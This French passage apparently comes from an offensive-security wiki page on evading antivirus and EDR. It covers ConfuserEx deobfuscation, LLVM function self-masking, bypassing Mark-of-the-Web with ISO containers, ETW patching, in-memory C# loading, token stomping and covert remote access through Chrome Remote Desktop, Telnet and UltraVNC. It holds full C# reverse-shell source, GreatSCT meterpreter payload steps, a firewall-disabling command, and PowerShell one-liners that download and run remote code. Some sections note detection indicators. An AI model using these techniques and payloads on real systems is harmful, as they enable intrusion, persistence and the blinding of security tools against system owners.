   La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`), qui peuvent être utiles pour créer votre propre unpacker.

2.  Récupération des symboles / du control-flow – transmettez le fichier *clean* à **de4dot-cex** (un fork de de4dot adapté à ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Options :
     • `-p crx` – sélectionner le profil ConfuserEx 2
     • de4dot annulera l’aplatissement du flux de contrôle, restaurera les espaces de noms, les classes et les noms de variables d’origine, et déchiffrera les chaînes constantes.

3.  Suppression des appels proxy – ConfuserEx remplace les appels directs de méthodes par des wrappers légers (aussi appelés *appels proxy*) afin de compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Après cette étape, vous devriez observer des API .NET standard comme `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire obtenu sous dnSpy, recherchez de gros blobs Base64 ou l’utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le *véritable* payload. Souvent, le malware le stocke sous forme de tableau d’octets encodé en TLV, initialisé dans `<Module>.byte_0`.

La chaîne d’opérations ci-dessus rétablit le flux d’exécution **sans** avoir besoin d’exécuter l’échantillon malveillant – pratique lorsque vous travaillez sur un poste de travail hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut servir d’IOC pour trier automatiquement les échantillons.

#### Commande en une ligne
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)** : obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator) : ce projet vise à fournir une version fork open source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité logicielle grâce à l'[obfuscation du code](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et à la protection contre les altérations.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator) : ADVobfuscator montre comment utiliser le langage `C++11/14` pour générer du code obfusqué à la compilation, sans outil externe ni modification du compilateur.
- [**obfy**](https://github.com/fritzone/obfy) : ajoute une couche d'opérations obfusquées générées par le framework de métaprogrammation par templates de C++, ce qui compliquera un peu la tâche de la personne qui souhaite cracker l'application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)** :** Alcatraz est un obfuscateur de binaires x64 capable d'obfusquer différents fichiers PE, notamment les fichiers .exe, .dll et .sys.
- [**metame**](https://github.com/a0rtega/metame) : Metame est un moteur de code métamorphique simple pour des exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator) : ROPfuscator est un framework d'obfuscation de code granulaire pour les langages pris en charge par LLVM, utilisant le ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant les instructions classiques en chaînes ROP, ce qui contrecarrent notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt) : Nimcrypt est un crypter PE .NET écrit en Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)** :** Inceptor peut convertir des fichiers EXE/DLL existants en shellcode, puis les charger.

### Auto-masquage par fonction assisté par le compilateur LLVM

Au lieu de masquer un implant entier uniquement pendant sa veille, un backend LLVM X86 modifié peut maintenir certaines fonctions masquées par XOR lorsqu'elles sont inactives. La PoC Function Peekaboo sélectionne les noms démanglés contenant `REG_`, injecte des stubs d'entrée et de sortie indépendants de la position autour du code machine final, et émet un gestionnaire de masquage partagé dans `.text` ; les signatures au niveau source et la convention d'appel Windows x64 restent inchangées.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformation du flux de contrôle du backend

Cette étape doit avoir lieu après la sélection des instructions et l'optimisation, car la transformation doit couvrir **chaque retour émis** et connaître la disposition x86 exacte. Un `MachineFunctionPass` exécuté avant l'émission trouve le dernier `MachineInstr::isReturn()`, le supprime pour que le chemin final tombe dans l'épilogue ajouté, et remplace les retours précédents par `JMP_1 handler`. Conservez toute la désallocation de pile/cadre générée par le compilateur avant chaque retour ; redirigez uniquement l'instruction de retour elle-même.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` et `X86AsmPrinter::emitFunctionBodyEnd()` émettent les stubs de chaque fonction, tandis que `emitEndOfAsmFile()` émet le gestionnaire. Des symboles partagés entre les étapes d'émission permettent à un branchement du prologue de cibler son épilogue ultérieur ; pour un `je` proche émis manuellement, écrivez `0F 84`, suivi de l'expression MC de quatre octets `target - address_after_je`. Les appels et sauts vers le gestionnaire peuvent plutôt être émis sous forme d'objets `MCInst` (`CALL64pcrel32` et `JMP_1`). Un pass doit renvoyer `false` pour une fonction non sélectionnée s'il n'a apporté aucune modification ; la PoC renvoie incorrectement `true` dans ce cas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Métadonnées et initialisation pré-CRT

La PoC place une clé XOR et des enregistrements de 16 octets contenant un pointeur de fonction relocalisé par le chargeur ainsi qu'une longueur d'exécution dans `.funcmeta`. Bien que le champ C soit un `uint32_t`, le gestionnaire lit un QWORD à l'offset `+8` de l'enregistrement, consommant la longueur et son remplissage, et avance les enregistrements de `0x10`. Les noms de sections PE ne font que huit octets ; la recherche à l'exécution voit donc `.funcmet`. Un outil externe ajoute un `.stub` exécutable, sauvegarde l'ancien RVA du point d'entrée dans le stub et redirige `AddressOfEntryPoint` ; le stub PIC récupère la base de l'image depuis `gs:[0x60]` → `[PEB+0x10]`, parcourt les imports PE32+ pour résoudre un `VirtualProtect` déjà importé et s'exécute avant le CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'initialisation définit une valeur sentinelle dans `gs:[0xE8]` et appelle chaque fonction référencée dans les métadonnées. Le prologue toujours lisible enregistre le début de la fonction dans `gs:[0xF0]`, détecte la valeur sentinelle et ignore le corps encore démasqué. L'épilogue utilise ensuite `call handler` ; une fois que le gestionnaire a sauvegardé 13 registres (`0x68` octets), l'adresse de retour à `[rsp+0x68]` correspond à la fin de la fonction transformée, ce qui permet d'écrire `end - start` dans son enregistrement de métadonnées. Le stub efface la valeur sentinelle et saute à `ImageBase + original_entry_point_RVA` une fois tous les corps masqués.<sup>[[38]](#references)[[39]](#references)</sup>

Lors d'un appel normal, le prologue appelle le même gestionnaire symétrique pour décoder le corps. Le chemin final tombe dans l'épilogue ajouté, tandis que chaque retour précédent saute directement vers le gestionnaire partagé. L'épilogue normal utilise aussi `jmp handler` plutôt que `call` ; après le re-masquage, le `ret` du gestionnaire consomme l'adresse de retour de l'appelant d'origine et préserve le résultat de la fonction dans `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive de masquage et indicateurs d'analyse

Le gestionnaire trouve l'enregistrement actuel, ignore le prologue fixe visible (long de `0x46` octets dans cette version), modifie les permissions du reste en `PAGE_EXECUTE_READWRITE`, applique un XOR octet par octet avec l'octet de poids faible de la clé, puis le passe en `PAGE_EXECUTE_READ`. La même boucle décode donc le corps à l'entrée et le code à chaque sortie normale.<sup>[[38]](#references)[[39]](#references)</sup>

Parmi les indicateurs forts de cette conception, on trouve :<sup>[[38]](#references)[[39]](#references)</sup>

- un point d'entrée situé dans un `.stub` exécutable et une section `.funcmet` contenant une clé ainsi que des pointeurs relocalisés vers `.text` ;
- l'analyse pré-CRT du PEB, de la table d'importation et de la table des sections, suivie d'appels via chaque pointeur de métadonnées ;
- des prologues PIC `call`/`pop` identiques et de nombreux points de retour redirigés vers un seul gestionnaire ;
- des écritures dans `gs:[0xE8]`, `gs:[0xF0]` et `gs:[0xF8]`, suivies d'appels répétés à `VirtualProtect` et d'écritures XOR octet par octet dans des pages exécutables adossées à l'image.

Il s'agit d'une technique d'évasion des scanners mémoire, et non d'une protection cryptographique : le fichier modifié contient toujours le corps d'origine en clair, et un débogueur peut s'arrêter sur `VirtualProtect` ou sur la boucle XOR et extraire la fonction active. Le XOR sur un seul octet, les métadonnées lisibles et la limite fixe `0x46` facilitent également la récupération hors ligne.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Les emplacements TEB de la PoC sont propres à chaque thread, mais les pages de code modifiées sont communes au processus. Une entrée concurrente ou récursive peut donc réactiver ou masquer les instructions pendant qu'une autre invocation s'exécute ; les exceptions et les sorties non locales peuvent également contourner le re-masquage. Une implémentation robuste doit synchroniser les transitions, restaurer la protection réellement renvoyée via `lpflOldProtect`, éviter les longueurs de stub codées en dur, vérifier l'alignement de pile x64 pour les chemins `call` et `jmp`, et appeler `FlushInstructionCache` après la réécriture d'octets exécutables. Microsoft indique explicitement qu'il incombe à l'appelant d'assurer la cohérence du cache d'instructions lorsque du code exécutable est modifié.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vous avez peut-être déjà vu cet écran en téléchargeant des exécutables depuis Internet et en les lançant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen repose principalement sur la réputation : les applications peu téléchargées déclenchent SmartScreen, qui alerte l'utilisateur final et l'empêche d'exécuter le fichier (celui-ci peut toutefois être exécuté en cliquant sur Plus d'informations -> Exécuter quand même).

**MoTW** (Mark of The Web) est un [flux de données alternatif NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nommé Zone.Identifier, créé automatiquement lors du téléchargement de fichiers depuis Internet, et qui contient l'URL d'où ils proviennent.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification du flux de données alternatif Zone.Identifier d'un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Notez que les exécutables signés avec un certificat de signature **de confiance** **ne déclenchent pas SmartScreen**.

Un moyen très efficace d'empêcher vos payloads d'obtenir le Mark of The Web consiste à les regrouper dans un conteneur, comme une image ISO. En effet, le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui regroupe des payloads dans des conteneurs de sortie afin d'échapper au Mark-of-the-Web.

Exemple d'utilisation :

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Voici une démonstration du contournement de SmartScreen en empaquetant des payloads dans des fichiers ISO avec [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation de Windows qui permet aux applications et aux composants système de **consigner des événements**. Cependant, les produits de sécurité peuvent également s'en servir pour surveiller et détecter les activités malveillantes.

Comme pour la désactivation (le contournement) d'AMSI, il est également possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement, sans consigner aucun événement. Pour cela, on patche la fonction en mémoire afin qu'elle retourne immédiatement, ce qui désactive de fait la journalisation ETW pour ce processus.

Vous trouverez plus d'informations dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) et [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Le chargement de binaires C# en mémoire est une technique connue depuis longtemps, et reste un excellent moyen d'exécuter vos outils de post-exploitation sans vous faire détecter par l'AV.

Puisque le payload sera chargé directement en mémoire, sans toucher au disque, il suffira de se préoccuper du patch d'AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) permettent déjà d'exécuter des assemblies C# directement en mémoire, mais il existe plusieurs façons de procéder :

- **Fork\&Run**

Cette méthode consiste à **lancer un nouveau processus sacrifiable**, à y injecter votre code malveillant de post-exploitation, à l'exécuter puis, une fois terminé, à tuer le nouveau processus. Cette méthode a des avantages et des inconvénients. Son avantage est que l'exécution a lieu **en dehors** du processus de notre implant Beacon. Ainsi, si une action de post-exploitation échoue ou est détectée, il y a **beaucoup plus de chances** que notre **implant survive.** Son inconvénient est que vous avez **plus de chances** d'être détecté par les **détections comportementales**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Cette méthode consiste à injecter le code malveillant de post-exploitation **dans son propre processus**. Vous évitez ainsi de créer un nouveau processus et de le faire analyser par l'AV. En revanche, si l'exécution de votre payload échoue, vous risquez **beaucoup plus** de **perdre votre beacon**, car le processus peut planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Pour en savoir plus sur le chargement d'assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ainsi que leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez également charger des assemblies C# **depuis PowerShell**. Découvrez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et [la vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Repackaging d'outils .NET en WebAssembly avec NativeAOT (WasmForge)

Les techniques `execute-assembly` classiques conservent du MSIL reconnaissable et finissent par initialiser un CLR. **WasmForge** modifie plutôt le substrat d'exécution : il migre un projet C# vers la cible expérimentale WASI NativeAOT-LLVM, le compile à l'avance en WebAssembly et intègre ce module dans un hôte PE Windows basé sur Wazero. Le processus obtenu n'a besoin ni du CLR de la cible, ni du JIT, ni de l'hôte `dotnet`. Les règles fondées uniquement sur les noms d'assemblies managées, le chargement du CLR, AMSI ou .NET ETW perdent donc leur visibilité directe. Il s'agit d'une technique d'évasion et d'empaquetage, et non d'un contournement des limites de privilèges : le code invité conserve les permissions de l'outil d'origine et son comportement observable au niveau du système d'exploitation.<sup>[[44]](#references)[[45]](#references)</sup>

### Compilation d'un projet C#

La méthode de compilation recommandée consiste à utiliser l'environnement Docker du projet, car il comprend le SDK .NET 10, le workload NativeAOT-LLVM, le WASI SDK 24.0, l'éditeur de liens et les dépendances de signature. Un fichier `.csproj` est détecté automatiquement ; une seule commande de build effectue la migration, les correctifs de compatibilité, la compilation WASM, la création du PE et la signature.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Pour le dépannage ou la revue du code généré, divisez le processus en `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, puis terminez par `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. L’image de build utilise également un wrapper `wasm-component-ld` pour éviter l’encodage de composants WASI Preview 2 et produire le module simple attendu par le runtime embarqué.<sup>[[44]](#references)[[45]](#references)</sup>

### Pont entre wasm32 C# et x64 Win32

Il ne s’agit pas d’une recompilation transparente. NativeAOT-WASI ne prend pas en charge certaines fonctionnalités du BCL orientées Windows, ou les modifie, et un guest wasm32 alloue normalement des emplacements de pointeur de quatre octets, alors que les API x64 peuvent renvoyer des pointeurs de huit octets. WasmForge répond à ces deux problèmes avec les couches générées suivantes :<sup>[[44]](#references)</sup>

1. Un patcher de code source corrige les différences sémantiques propres à AOT et redirige les appels non pris en charge liés au registre, aux pipes, à WMI, à l’identité, aux services d’annuaire, aux versions de fichiers, à LSA et autres vers des helpers `Wf*`.
2. Un scanner P/Invoke génère des mappages NativeAOT `DirectPInvoke` afin que les appels `[DllImport]` soient liés à des symboles C de bridge liés, plutôt que de charger dynamiquement la DLL déclarée dans le guest.
3. Les pointeurs destinés à l’hôte utilisent `ulong` en C# et `uint64_t` en C. Un dispatcher générique transmet l’appel au gestionnaire Win32 de l’hôte ; un `out8_mask` indique les véritables emplacements de sortie de huit octets dont les moitiés supérieures doivent être conservées. Les sorties non marquées, au format wasm32, sont protégées par un mécanisme de snapshot/restauration afin qu’une écriture x64 ne corrompe pas les quatre octets adjacents.
4. Des bridges dédiés côté hôte gèrent les opérations qui ne se prêtent pas à un dispatch générique des appels système, comme l’accès au cache de tickets LSA, les opérations Kerberos/BCrypt avec des résultats structurés, le trafic TCP vers KDC et les requêtes LDAP.

Par exemple, un wrapper pour `version.dll!VerQueryValueW` transmet quatre adresses hôte et définit les bits 2 et 3 (`0xC`), car le pointeur de valeur et la longueur sont des emplacements de sortie de huit octets. Le wrapper reste générique et transmet le nom de la DLL, le nom de l’export, les arguments et le masque à `wf_call_v2` ; l’hôte effectue la traduction des pointeurs et appelle l’API native.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Limitations et pistes de détection

Le code faisant largement appel à la réflexion, le chargement dynamique d’assembly, les callbacks natifs arbitraires et les structures x64 complexes renvoyées dans la mémoire WASM peuvent encore nécessiter des correctifs propres à chaque outil ou échouer complètement. Les sockets génériques de WASI Preview 2 peuvent également aboutir à des stubs sans effet ; les outils compatibles utilisent donc des shims hôtes propres à chaque protocole. Validez chaque commande par rapport à une build native au lieu de supposer que les fonctionnalités sont équivalentes.<sup>[[44]](#references)[[45]](#references)</sup>

Cette technique déplace la télémétrie au lieu de rendre le payload invisible. La détection peut se concentrer sur un PE contenant ou matérialisant un module WASM, le comportement d’un runtime de type Wazero, des allocations et copies inhabituelles de mémoire hôte/invité, la répartition générique des appels directs Win32, les anomalies de signature et de ressources PE, ainsi que les appels API et le trafic réseau qui en résultent. L’absence d’événements de chargement du CLR, d’AMSI ou d’ETW .NET ne doit donc pas être considérée comme une preuve qu’un processus est inoffensif.<sup>[[44]](#references)</sup>

## Utilisation d’autres langages de programmation

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d’exécuter du code malveillant dans d’autres langages en donnant à la machine compromise accès **à l’environnement d’interpréteur installé sur le partage SMB contrôlé par l’attaquant**.

En donnant accès aux binaires de l’interpréteur et à l’environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le dépôt indique que Defender analyse toujours les scripts, mais qu’en utilisant Go, Java, PHP, etc., nous avons **plus de flexibilité pour contourner les signatures statiques**. Les tests menés avec des scripts de reverse shell aléatoires et non obfusqués dans ces langages ont été concluants.

## Réhébergement de WebAssembly pour contourner l’analyse statique

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Le token stomping manipule le jeton d’accès d’un produit de sécurité comme un EDR ou un antivirus. Réduire les privilèges du jeton peut laisser le processus en cours d’exécution tout en l’empêchant d’effectuer des actions d’inspection ou de remédiation privilégiées.

Pour éviter cela, Windows pourrait **empêcher les processus externes** d’obtenir des handles sur les jetons des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Utilisation de logiciels de confiance

### Chrome Remote Desktop

Comme décrit dans [**cet article de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d’une victime, puis de l’utiliser pour en prendre le contrôle et maintenir la persistance :<sup>[[35]](#references)</sup>
1. Téléchargez le logiciel depuis https://remotedesktop.google.com/, cliquez sur « Set up via SSH », puis sur le fichier MSI pour Windows afin de le télécharger.
2. Exécutez silencieusement le programme d’installation sur la machine de la victime (droits d’administrateur requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur Next. L’assistant vous demandera alors de vous autoriser ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez la commande fournie en apportant les ajustements requis : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (le paramètre `--pin` définit le PIN sans utiliser l’interface graphique).
 

## Évasion avancée

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

L’évasion est un sujet très complexe. Il faut parfois tenir compte de nombreuses sources de télémétrie différentes sur un seul système ; il est donc pratiquement impossible de rester complètement indétectable dans des environnements matures.

Chaque environnement que vous ciblez aura ses propres points forts et points faibles.

Je vous recommande vivement de regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94) pour découvrir des techniques d’évasion plus avancées.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Voici également une excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l’évasion en profondeur.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Anciennes techniques**

### **Vérifier quelles parties Defender considère comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), qui **supprime des parties du binaire** jusqu’à **identifier la partie que Defender** considère comme malveillante, puis vous l’extrait.\
Un autre outil qui fait **la même chose est** [**avred**](https://github.com/dobin/avred), qui propose le service sur le Web à l’adresse [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu’à Windows 10, toutes les versions de Windows incluaient un **serveur Telnet** que vous pouviez installer (en tant qu’administrateur) en exécutant :

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant :

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Modifier le port telnet** (furtif) et désactiver le pare-feu :

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements bin, pas le programme d’installation)

**SUR L’HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l’option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier _**UltraVNC.ini**_ **nouvellement** créé dans le **système victime**

#### **Connexion inversée**

L’**attaquant** doit **exécuter sur** son **hôte** le binaire `vncviewer.exe -listen 5900` afin d’être **prêt** à recevoir une **connexion VNC** inversée. Ensuite, sur le **système victime** : démarrez le daemon winvnc avec `winvnc.exe -run`, puis exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVERTISSEMENT :** Pour rester discret, vous ne devez pas faire certaines choses

- Ne démarrez pas `winvnc` s’il est déjà en cours d’exécution, sinon vous déclencherez une [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s’il est en cours d’exécution avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon la [fenêtre de configuration](https://i.imgur.com/rfMQWcf.png) s’ouvrira
- N’exécutez pas `winvnc -h` pour obtenir de l’aide, sinon vous déclencherez une [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dans GreatSCT :

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Maintenant, **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **payload xml** avec :

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Le Defender actuel terminera le processus très rapidement.**

### Compilation de notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier Revershell C#

Compilez-le avec :

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

À utiliser avec :

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# avec le compilateur

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d’obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

